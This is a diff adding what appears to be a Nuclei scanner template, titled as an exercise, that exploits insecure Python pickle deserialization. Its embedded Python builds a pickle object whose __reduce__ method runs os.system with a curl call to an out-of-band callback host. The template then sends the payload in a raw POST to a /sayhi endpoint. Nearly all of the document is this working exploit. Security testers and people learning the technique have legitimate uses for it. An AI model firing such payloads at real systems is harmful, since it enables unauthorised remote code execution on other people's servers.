@@ -1,0 +1,40 @@
+id: exercise-3-template
+
+info:
+  name: exercise-3-template
+  author: bounce
+  severity: low
+
+variables:
+  OAST: "{$CHANGE_ME}"
+
+code:
+  - engine:
+      - python3
+    source: |
+      import pickle
+      import sys
+      import os
+              
+      def generate_payload(cmd):
+
+        class PickleRce(object):
+          def __reduce__(self):
+            return os.system, (cmd,)
+
+        payload = pickle.dumps(PickleRce())
+
+        return payload
+              
+      url = os.getenv('OAST')
+      sys.stdout.buffer.write(bytes(generate_payload(f'curl https://{url}')))
+
+http:
+  - raw:
+      - |
+        POST /sayhi HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-pickle
+        Serializer: {$CHANGE_ME}
+        
+        {{code_response}}
